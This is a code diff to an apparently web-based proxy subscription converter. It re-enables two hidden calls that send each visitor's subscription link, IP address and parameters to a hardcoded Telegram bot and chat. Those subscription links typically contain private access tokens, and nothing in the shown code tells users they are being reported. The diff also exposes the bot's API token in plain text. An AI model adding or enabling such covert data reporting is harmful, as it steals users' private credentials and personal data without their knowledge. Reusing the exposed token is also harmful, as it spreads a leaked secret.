@@ -49,7 +49,7 @@ def index():
             CustomSSR = 'http://{ip}/ssr/nico?sublink={sub}&custom={custom}'.format(ip=api.aff.apiip,sub=str(sub),custom=str(custom))
         QX = 'http://{ip}/qx/nico?sublink={sub}&tag=stc'.format(ip=api.aff.apiip,sub=str(sub))
         Loon = 'http://{ip}/loon/nico?sublink={sub}&tag=stc'.format(ip=api.aff.apiip,sub=str(sub))
-        #requests.post('https://api.telegram.org/bot976092923:AAFqWi5Z6XqDffkdxDc7gqyDDMg12ufXFW8/sendMessage?chat_id=447216258&text={text}'.format(text='有人打开了你的托管页面 : \n')+sub+'\n调用IP为：'+ip+'\n参数为'+custom)
+        requests.post('https://api.telegram.org/bot976092923:AAFqWi5Z6XqDffkdxDc7gqyDDMg12ufXFW8/sendMessage?chat_id=447216258&text={text}'.format(text='有人打开了你的托管页面 : \n')+sub+'\n调用IP为：'+ip+'\n参数为'+custom)
         return render_template('index.html', Clash = Clash,QX = QX,Loon=Loon,CustomClash = CustomClash,CustomSSR = CustomSSR,Custom =request.form['custom'] ,sub = sub,CustomGroupClash=CustomGroupClash,Custommethod=request.form['custommethod'])
     return render_template('index.html')
 
@@ -97,7 +97,7 @@ def clashapigroup():
         except Exception as e:
             custom = ''
         #print(custom)
-        #requests.post('https://api.telegram.org/bot976092923:AAFqWi5Z6XqDffkdxDc7gqyDDMg12ufXFW8/sendMessage?chat_id=447216258&text={text}'.format(text='有人调用了New_Clash分组API : \n'+sub+str(custom)))
+        requests.post('https://api.telegram.org/bot976092923:AAFqWi5Z6XqDffkdxDc7gqyDDMg12ufXFW8/sendMessage?chat_id=447216258&text={text}'.format(text='有人调用了New_Clash分组API : \n'+sub+str(custom)))
         if custom == '' or custom == None :
             return api.clash.writeRules(sub,arg)
         else :
